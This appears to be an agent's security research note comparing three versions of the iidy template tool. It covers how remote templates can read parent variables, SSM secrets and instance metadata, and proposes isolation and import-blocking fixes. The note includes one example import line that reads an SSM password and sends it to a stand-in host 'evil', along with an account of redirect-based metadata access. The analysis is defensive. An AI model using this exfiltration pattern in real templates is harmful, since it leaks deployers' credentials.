@@ -1,0 +1,451 @@
+#+title: C15 — What remote templates may inherit and import: options
+#+date: 2026-11-16
+
+Research for the C15 task "Write up the options and compare with the
+TypeScript and Rust versions". Written by worker claude-C15. No code was
+changed. Line numbers are against =main= at 250154c (iidy-hs), and the
+read-only checkouts =~/src/iidy= (Rust) and =~/src/iidy-js= (TypeScript).
+
+The threat is the one in the C4 review:
+[[id:org:01a1e68e-1585-707c-91d5-94ce6b11308a][High: remote templates can read secrets and exfiltrate them]].
+A remote document has three sources of sensitive data (parent variables,
+AWS reads with the deployer's credentials, internal HTTP such as instance
+metadata) and one outbound channel (Handlebars-interpolated import
+locations, which send any value to a host the author chooses).
+
+* Summary
+:PROPERTIES:
+:ID: org:01a1e6a7-16d6-70c3-bfba-430d5afc05e4
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- iidy-hs passes the importing template's full variable set into every
+  imported document. Rust and TypeScript do not: both resolve an imported
+  document in an empty environment holding only its own =$defs= and
+  =$imports=. So the parent-variable leak is an unrecorded divergence from
+  Rust, and fixing it is Rust parity, not a new restriction.
+- All three versions let a remote document import =ssm:=, =ssm-path:=,
+  =cfn:=, =s3:= and any =http(s):= URL (loopback and instance metadata
+  included), and all three interpolate import locations from the
+  document's own variables. So a remote document can read an SSM
+  SecureString itself and send it out, in every version.
+- Custom resource templates (imported documents with =$params=) are a
+  second variable path. iidy-hs and Rust expand them with the parent's
+  variables plus the parameters; TypeScript expands them with the
+  parameters plus the template's own imports only.
+- Recommendation: option (c), both isolation and import blocking, with
+  isolation applied to all imported documents (Rust parity) and an opt-in
+  trust flag for named sources (option (e)) so users with remote
+  templates that read SSM or CloudFormation can keep working.
+
+* Current Haskell behaviour
+:PROPERTIES:
+:ID: org:01a1e6a7-16d6-70c3-bfba-430ce0ee5623
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+** What an imported document inherits
+:PROPERTIES:
+:ID: org:01a1e6a7-16d6-70c3-bfba-430b97e625ce
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- =src/Iidy/Yaml/Engine.hs:199= calls =processImportedDoc= with the
+  importing template's =env= (all of its =$defs= and every import loaded
+  before this one).
+- =src/Iidy/Yaml/Engine.hs:233= passes that =env= as the starting
+  environment of =loadImportsAndDefs= for the imported document, so the
+  imported document's own =$defs= and =$imports= are layered on top of
+  the parent's variables, and its body is resolved with that union
+  (=:238-243=).
+- The docstring at =src/Iidy/Yaml/Engine.hs:211-213= says this matches
+  Rust's =process_imported_document=; it does not (see the Rust section).
+  The inheritance arrived with commit 865cb3b (2026-03-03) and no test or
+  =DIVERGENCES.md= entry covers it. The tests in
+  =test/Test/EngineTest.hs:128-260= ("Recursive import preprocessing") do
+  not reference a parent variable from an imported document.
+- This applies to every imported document, local or remote. Only
+  documents that contain =$imports= or =$defs= are re-processed
+  (=:226=, =:249-251=); others are returned as data.
+- Custom resource templates: the body of an imported template with
+  =$params= is expanded with the parent context plus the parameters, at
+  =src/Iidy/Yaml/Resolution/Resolver.hs:319-330= (=buildReparse=, union at
+  =:326=) for resource-type use and at =:888-895= (=resolveExpand=, union
+  at =:892=) for =!$expand=. The result lands in the rendered template, so
+  a remote custom template can place a parent secret into a deployed
+  resource (for example inline Lambda code or a subscription endpoint).
+  This channel has no network fetch at render time, but it is a leak.
+
+Reproduced locally (no network), parent =$defs: {secret: hunter2}=
+importing =./child.yaml= whose body is =got: !$ secret= plus its own
+=$defs=:
+
+#+begin_example
+iidy-hs render parent.yaml   ->  out: {got: hunter2, own: mine}
+iidy render parent.yaml      ->  Variable error: 'secret' not found
+                                 @ ./child.yaml:3:9 (ERR_2001)
+                                 available variables: own
+#+end_example
+
+The same test with a =$params= template whose body uses ={{secret}}=
+renders =x-hunter2= in both iidy-hs and Rust.
+
+** Which import types a remote document may use
+:PROPERTIES:
+:ID: org:01a1e6a7-16d6-70c3-bfba-430a7ba8e83c
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- =src/Iidy/Yaml/Imports/Types.hs:63-86= (=parseImportType=) rejects only
+  the local-only types (=:128-135=: =file=, =env=, =git=, =filehash=,
+  =filehash-base64=) when the base is remote. A plain relative path maps
+  to =file= (=:79=), so it is rejected too.
+- The base counts as remote only for =s3://=, =http://=, =https://=
+  (=:122-126=). Card C14 makes this fail closed; this card builds on that
+  classification and does not redo it.
+- =src/Iidy/Yaml/Imports/Loaders/Dispatch.hs:63-77=: =http=, =s3= (both
+  subject to =--no-remote-imports=) and =cfn=, =ssm=, =ssm-path= (never
+  subject to it, comment at =:71-73=) are dispatched regardless of base.
+- =src/Iidy/Yaml/Imports/Loaders/Ssm.hs:117= and =:133= request
+  =withDecryption = Just True=, so SecureStrings arrive in plain text.
+- =src/Iidy/Yaml/Imports/Loaders/Http.hs:104-114= uses =parseRequest=
+  with the default =http-client= redirect policy (follows redirects) and
+  no address check, so loopback, private and link-local targets
+  (=169.254.169.254=, =fd00:ec2::254=) are reachable directly or by a
+  redirect.
+- =--no-remote-imports= (=src/Iidy/Cli/Parser.hs:140=) is iidy-hs only;
+  it is a user switch that blocks =http= and =s3= for all templates and
+  does not distinguish remote from local requesters.
+
+** How an import URL is built from imported values
+:PROPERTIES:
+:ID: org:01a1e6a7-16d6-70c3-bfba-4309ad318660
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- =src/Iidy/Yaml/Engine.hs:170= interpolates each import location with
+  =interpolateLocation env= (=:257-262=) before loading it. =env= holds
+  the document's variables so far: today the parent's variables plus the
+  document's own =$defs= and earlier =$imports= (processed in order,
+  =:203-205=). Helpers such as =urlEncode= are available.
+- So =$imports: {s: "ssm:/prod/db/password", x: "https://evil/{{s}}"}=
+  in a remote document reads the secret and sends it, and so does
+  ={{secret}}= naming a parent variable. The import record is not shown
+  by =render=.
+
+** Documentation that states the model
+:PROPERTIES:
+:ID: org:01a1e6a7-16d6-70c3-bfba-430890a17a8c
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+=SECURITY.md:35-48= lists =s3=, =http=, =cfn=, =ssm=, =ssm-path= as
+allowed from remote templates and =:115-127= presents "AWS Integration"
+as intended. =SECURITY.md:101-112= claims protection against credential
+theft. Nothing in =docs/= says whether imported documents see parent
+variables.
+
+* Rust version (=~/src/iidy=)
+:PROPERTIES:
+:ID: org:01a1e6a7-16d6-70c3-bfba-4307e5afece3
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- Variables: =src/yaml/engine.rs:380-442= (=process_imported_document=)
+  starts each imported document with =EnvValues::new()= (=:409=) and
+  resolves it with only its own variables (=:420-428=). No parent
+  variable reaches an imported document, local or remote.
+- Custom templates: =src/yaml/custom_resources/expansion.rs:56-60= and
+  =src/yaml/resolution/resolver.rs:1919-1921= build the expansion context
+  with =context.with_bindings(params)=, which keeps the parent's
+  variables. Same as iidy-hs.
+- Import types: =src/yaml/imports/mod.rs:215-292= (=parse_import_type=)
+  rejects only =is_local_only= types (=:154-163=, same five as iidy-hs)
+  from =s3:= / =http(s):= bases (=:251-261=, which also treats the short
+  =s3:= form as remote). A plain relative path from a remote base
+  inherits the base type (=:267-281=) instead of being rejected.
+  =cfn=, =ssm=, =ssm-path=, =s3=, =http= are allowed from remote.
+- SSM decrypts (=src/yaml/imports/loaders/ssm.rs:45=, =:70=). HTTP uses
+  =reqwest::Client::new()= (=src/yaml/imports/loaders/mod.rs:69=), which
+  follows redirects and has no address filter.
+- Interpolation: =src/yaml/engine.rs:281-282= and =:349-376= interpolate
+  the location with the current document's variables. Because of the
+  isolation above, a remote document can interpolate only its own values,
+  which still include whatever it imported from =ssm:= or =cfn:=.
+- There is no =--no-remote-imports= flag.
+
+* TypeScript version (=~/src/iidy-js=)
+:PROPERTIES:
+:ID: org:01a1e6a7-16d6-70c3-bfba-4306e5f7ba90
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- Variables: =src/preprocess/index.ts:471-528= (=loadImports=) keeps
+  variables in each document's own =$envValues= (=:478=) and recurses
+  into an imported document with that document's own map (=:524-527=).
+  At resolution, =src/preprocess/visitor.ts:581-605=
+  (=visitImportedDoc=) builds the environment from =node.$envValues=
+  only; =mkSubEnv= (=:68-78=) replaces the variable map rather than
+  extending it. Imported documents are isolated.
+- Custom templates: =src/preprocess/visitor.ts:797-805= (resource-type
+  use) and =:190-203= (=!$expand=) build the environment from =Prefix=,
+  =$globalRefs=, the merged parameters and =template.$envValues=; the
+  parent's variables are not included. TypeScript isolates templates too.
+- Import types: =src/preprocess/index.ts:152= lists only =file= and =env=
+  as local-only; =:184-210= (=parseImportType=) therefore allows =git=,
+  =filehash=, =cfn=, =ssm=, =ssm-path=, =s3=, =http= from remote, and a
+  plain relative path inherits the base type (=:199-200=).
+- SSM decrypts (=:427=). HTTP is =request.get= (=:380-385=), which follows
+  redirects, with no address filter.
+- Interpolation: =:501-503= interpolates with the document's own
+  =$envValues=.
+
+* Comparison
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-9904b069a28b
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+| Behaviour                        | iidy-hs    | Rust    | TypeScript |
+|----------------------------------+------------+---------+------------|
+| Imported doc sees parent vars    | yes        | no      | no         |
+| Custom template sees parent vars | yes        | yes     | no         |
+| Remote may import =ssm:= =cfn:=  | yes        | yes     | yes        |
+| Remote may import =s3:= =http:=  | yes        | yes     | yes        |
+| Loopback/link-local HTTP blocked | no         | no      | no         |
+| Remote may import =git:=         | no         | no      | yes        |
+| Plain relative path from remote  | rejected   | inherit | inherit    |
+| Import URL interpolation         | own+parent | own     | own        |
+
+* Options
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-99032bdbe492
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+Scenario steps used below: (1) parent variables, (2) AWS reads, (3)
+internal HTTP, all sent out through (4) the interpolated import URL.
+"Untrusted document" means a document whose base C14's fail-closed check
+classifies as not local.
+
+** (a) Block AWS-backed and internal-address imports from untrusted documents
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-9902a218797e
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+What it does: an untrusted document may not import =ssm:=, =ssm-path:=,
+=cfn:= or =s3:=, and its =http(s):= imports may not reach loopback
+(=127.0.0.0/8=, =::1=), link-local (=169.254.0.0/16=, =fe80::/10=,
+=fd00:ec2::254=) or unspecified addresses, checked on every redirect hop.
+Local templates are unaffected.
+
+- Blocks: steps (2) and (3). Does not block (1): a parent variable
+  (including one the parent read from SSM) still reaches the remote
+  document and leaves through (4).
+- Breaks: remote templates that read SSM parameters or stack outputs
+  themselves; S3-hosted templates that import other S3 objects (S3-to-S3
+  composition, documented in =SECURITY.md:117-121=) unless a same-bucket
+  exception is made; remote templates fetched from an HTTP server on
+  localhost (for example a local dev server). No test fixture uses remote
+  imports, so the suite would not show the breakage; users would.
+- Size: =src/Iidy/Yaml/Imports/Types.hs= (an =isAwsBacked= class and the
+  check in =parseImportType=, about 30-60 lines),
+  =src/Iidy/Yaml/Imports/Loaders/Http.hs= (address filter, about 100-150
+  lines). Two ways to filter: turn off automatic redirects
+  (=redirectCount = 0=) and follow them by hand, resolving and checking
+  each host; or check the connected socket address in a custom
+  =managerRawConnection= (also covers DNS rebinding; more code, uses
+  =Network.HTTP.Client.Internal=). =network= is already a dependency; no
+  new package needed. =Dispatch.hs= must pass the base to the HTTP loader
+  so it knows the requester is untrusted. Plus SECURITY.md and tests.
+- Compatibility: neither Rust nor TypeScript restricts these; this is a
+  new divergence for =DIVERGENCES.md=.
+
+** (b) Isolate imported documents from parent variables
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-9901eb1282b2
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+What it does: an imported document starts with an empty environment;
+data reaches it only through explicit parameters (=$params= with
+=!$expand= or a custom resource type), as in Rust and TypeScript. Two
+sub-choices:
+
+- (b1) Plain imported documents only: change =Engine.hs:199= / =:233= to
+  start from =Map.empty=. This is Rust parity. Apply it to all imported
+  documents (as Rust and TypeScript do) or only to untrusted ones.
+- (b2) Also custom templates loaded from untrusted locations: expand them
+  with parameters plus their own imports only (=Resolver.hs:326=, =:892=),
+  as TypeScript does. Rust keeps the parent context here.
+
+- Blocks: step (1). Does not block (2)-(4): a remote document can still
+  import =ssm:/prod/db/password= itself and interpolate it into a URL.
+- Breaks: (b1) local or remote imported documents that use a parent
+  variable; such templates already fail in Rust and TypeScript, so they
+  were never portable. (b2) remote custom templates that read a parent
+  variable without declaring it as a parameter; such templates already
+  fail in TypeScript but work in Rust.
+- Size: (b1) about 5 lines in =src/Iidy/Yaml/Engine.hs= (drop the =env=
+  argument of =processImportedDoc=, fix the docstring) plus a regression
+  test in =test/Test/EngineTest.hs=. If restricted to untrusted
+  documents, the engine needs the trust predicate from
+  =Imports/Types.hs= (exported by C14). (b2) the template's location is in
+  =TemplateInfo= (=tiLocation=), so the two resolver sites can choose an
+  empty base context when it is untrusted: about 20-40 lines in
+  =src/Iidy/Yaml/Resolution/Resolver.hs=, which is large already.
+- Compatibility: (b1) for all documents restores Rust and TypeScript
+  behaviour and needs no =DIVERGENCES.md= entry. (b2) matches
+  TypeScript and diverges from Rust.
+
+** (c) Both (a) and (b)
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-9900a1c7cfc0
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- Blocks: steps (1), (2) and (3). An untrusted document's variables then
+  hold only its own =$defs=, =random:= values and content fetched from
+  other external hosts, none of which is the deployer's secret, so (4)
+  has nothing sensitive to send. The remaining leak is a parameter the
+  user chooses to pass to a remote custom template, which is visible in
+  the user's own template.
+- Breaks: the union of (a) and (b).
+- Size: the sum, about 200-250 lines plus tests and SECURITY.md.
+- Compatibility: Rust parity for (b1); new divergence for (a) and (b2).
+
+** (d) Forbid interpolation in import locations of untrusted documents
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-98ffba9bd4ef
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+What it does: an untrusted document's =$imports= values must be literal;
+any ={{= is an error. Cheap (a few lines at =Engine.hs:170=, given the
+trust predicate).
+
+- Blocks: step (4) as a URL channel, so no secret leaves at render time.
+- Does not block: the reads themselves (an untrusted document still
+  reads SSM or instance metadata, and with (b) absent, sees parent
+  variables), and the rendered-output channel (the document can place
+  the value in a deployed resource).
+- Breaks: remote documents that build import URLs from their own
+  =$defs=, for example by environment or region.
+- Compatibility: neither version restricts this. Useful as a cheap
+  stopgap, weaker than (c).
+
+** (e) Opt-in trust for named sources (combine with (a) or (c))
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-98fe8c5ea74b
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+What it does: a repeatable flag, for example
+=--trust-import-source PREFIX= (and perhaps a stack-args key), lists
+location prefixes (=https://templates.example.com/=,
+=s3://our-bucket/=) whose documents are treated as local-equivalent for
+(a) and (b2), so they may read SSM and CloudFormation as today. Default:
+no trusted sources.
+
+- Blocks: nothing on its own; it limits the breakage of (a) to sources
+  the user has not vouched for.
+- Breaks: nothing; users of remote templates that read AWS data add one
+  flag.
+- Size: CLI flag in =src/Iidy/Cli/Parser.hs= and =Help.hs=, a field in
+  =ImportConfig= (=Dispatch.hs:35-38=), prefix match in the trust check;
+  about 60-100 lines. Touches =src/Iidy/Cli/= and possibly stack-args
+  loading, which is outside the card's allowed paths (=src/Iidy/Yaml/=);
+  the card scope would need widening.
+- Compatibility: new flag, Haskell only, like =--no-remote-imports=.
+
+** Considered and rejected
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-98fd4525bb8d
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- Same-origin rule (an untrusted document may import only from its own
+  scheme and host or bucket): blocks (2) and (3) for most cases but not
+  exfiltration to the attacker's own origin, and breaks partner
+  templates that combine HTTP and S3. (a) is simpler to state.
+- Taint tracking (mark values derived from AWS reads or parent variables
+  and refuse them in URLs): precise but a large change across the
+  resolver and Handlebars engine for little gain over (c).
+- Blocking private ranges (=10/8=, =172.16/12=, =192.168/16=) by default:
+  breaks templates served from internal artifact servers, which is a
+  normal use of HTTP imports. Left as a question.
+
+* Recommendation
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-98fc101a7472
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+Adopt (c) with (e):
+
+1. Isolate all imported documents from parent variables (b1, all
+   documents). It closes step (1), it is what Rust and TypeScript already
+   do, the code change is small, and templates that depend on the current
+   behaviour do not work in the other two versions anyway.
+2. Isolate custom templates loaded from untrusted locations (b2). Without
+   it, a remote custom template still receives every parent variable and
+   can place them in deployed resources; TypeScript already behaves this
+   way.
+3. Block =ssm:=, =ssm-path:=, =cfn:= and cross-bucket =s3:= from
+   untrusted documents, and block loopback and link-local HTTP targets
+   requested by untrusted documents with a per-hop check (a). Without it,
+   step (2) alone is enough to steal SSM SecureStrings.
+4. Add =--trust-import-source= (e) so teams that host templates which
+   read SSM or CloudFormation in their own bucket or server can opt
+   those sources back in. This keeps (a) from being a hard break.
+5. Rewrite =SECURITY.md= "Remote-Allowed Import Types" and "What This
+   Allows" to state the new model and the exfiltration reason, and record
+   (a), (b2) and (e) in =DIVERGENCES.md=.
+
+(d) is not needed once (c) holds; it can be a stopgap if (a) is
+deferred.
+
+* Questions for Tavis
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-98fb81c1bf7b
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+1. Isolation scope: isolate all imported documents (Rust and TypeScript
+   behaviour, breaks local imported documents that read parent
+   variables), or only untrusted ones?
+2. Custom templates: should templates loaded from untrusted locations
+   lose access to parent variables (TypeScript behaviour, diverges from
+   Rust), and should local custom templates keep it (Rust behaviour)?
+3. AWS-backed imports from untrusted documents: block =ssm:=,
+   =ssm-path:= and =cfn:= by default? Is =s3:= blocked from HTTP-hosted
+   documents but allowed within the same bucket for S3-hosted ones, or
+   blocked entirely?
+4. HTTP address filter: block loopback and link-local only, or private
+   ranges too? Apply it only to imports requested by untrusted
+   documents (recommended), or to all HTTP imports?
+5. Opt-in trust: add =--trust-import-source PREFIX=? If so, also as a
+   stack-args or global config key? This needs the card's allowed paths
+   widened to =src/Iidy/Cli/= (and stack-args loading if a key is
+   wanted).
+6. Documents loaded through =ssm:= or =cfn:= (whose content is YAML with
+   =$imports=): treat them as untrusted for these rules, as C14 does for
+   local-only types?
+
+* Side findings (not C15 scope)
+:PROPERTIES:
+:ID: org:01a1e6a7-16d5-7220-9d38-98fa64350cbc
+:ADDED: [2026-11-16 Mon 16:17]
+:END:
+
+- A plain relative import from a remote document is rejected in iidy-hs
+  (=Types.hs:79= maps it to =file=) but inherits the base type in Rust
+  (=src/yaml/imports/mod.rs:267-281=) and TypeScript (=index.ts:199-200=),
+  and =SECURITY.md:49-58= and =docs/import-types.md:285= document the
+  inheriting behaviour. C14's gate lists "plain path" among the
+  spellings to reject, which keeps the divergence. The supervisor may
+  want this reconciled in C14 or a new card.
+- A plain imported document (no =$imports= or =$defs=) whose body holds
+  an unresolved =!$ name= tag renders as ='!$escaped'= in iidy-hs and as
+  =!$ secret= in Rust. Small output divergence; possibly worth a card.
